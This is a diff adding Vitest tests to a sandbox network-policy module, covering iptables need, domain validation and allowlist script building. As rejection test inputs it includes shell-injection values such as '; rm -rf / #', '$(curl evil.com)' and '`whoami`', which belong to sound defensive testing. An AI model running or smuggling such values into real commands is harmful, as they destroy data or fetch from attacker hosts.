@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { resolveNetworkMode, buildAllowlistScript } from '../network-policy.js';
+import { resolveNetworkMode, buildAllowlistScript, needsIptables, isValidDomain } from '../network-policy.js';
 
 describe('resolveNetworkMode', () => {
   it('returns bridge for open tier', () => {
@@ -12,6 +12,52 @@ describe('resolveNetworkMode', () => {
 
   it('returns none for locked tier', () => {
     expect(resolveNetworkMode('locked')).toBe('none');
+  });
+});
+
+describe('needsIptables', () => {
+  it('returns true for balanced with non-empty allowlist', () => {
+    expect(needsIptables('balanced', ['example.com'])).toBe(true);
+  });
+
+  it('returns false for open', () => {
+    expect(needsIptables('open', ['example.com'])).toBe(false);
+  });
+
+  it('returns false for locked', () => {
+    expect(needsIptables('locked', ['example.com'])).toBe(false);
+  });
+
+  it('returns false for balanced with empty allowlist', () => {
+    expect(needsIptables('balanced', [])).toBe(false);
+  });
+});
+
+describe('isValidDomain', () => {
+  it('accepts valid domains', () => {
+    expect(isValidDomain('example.com')).toBe(true);
+    expect(isValidDomain('api.openai.com')).toBe(true);
+    expect(isValidDomain('registry.npmjs.org')).toBe(true);
+    expect(isValidDomain('deb.debian.org')).toBe(true);
+  });
+
+  it('rejects shell injection attempts', () => {
+    expect(isValidDomain('; rm -rf / #')).toBe(false);
+    expect(isValidDomain('$(curl evil.com)')).toBe(false);
+    expect(isValidDomain('`whoami`')).toBe(false);
+    expect(isValidDomain('a; b')).toBe(false);
+    expect(isValidDomain('a | b')).toBe(false);
+  });
+
+  it('rejects empty or whitespace', () => {
+    expect(isValidDomain('')).toBe(false);
+    expect(isValidDomain(' ')).toBe(false);
+  });
+
+  it('rejects domains starting/ending with special chars', () => {
+    expect(isValidDomain('.example.com')).toBe(false);
+    expect(isValidDomain('example.com.')).toBe(false);
+    expect(isValidDomain('-example.com')).toBe(false);
   });
 });
 
@@ -54,5 +100,23 @@ describe('buildAllowlistScript', () => {
     const lines = script.split('\n');
     const lastNonEmpty = lines.filter(l => l.trim()).pop();
     expect(lastNonEmpty).toBe('iptables -A OUTPUT -j DROP');
+  });
+
+  it('filters out invalid domains (shell injection protection)', () => {
+    const script = buildAllowlistScript('balanced', [
+      'valid.com',
+      '; rm -rf /',
+      '$(curl evil.com)',
+      'also-valid.org',
+    ]);
+    expect(script).not.toBeNull();
+    expect(script).toContain('valid.com');
+    expect(script).toContain('also-valid.org');
+    expect(script).not.toContain('rm -rf');
+    expect(script).not.toContain('curl evil');
+  });
+
+  it('returns null when all domains are invalid', () => {
+    expect(buildAllowlistScript('balanced', ['; bad', '$(evil)'])).toBeNull();
   });
 });
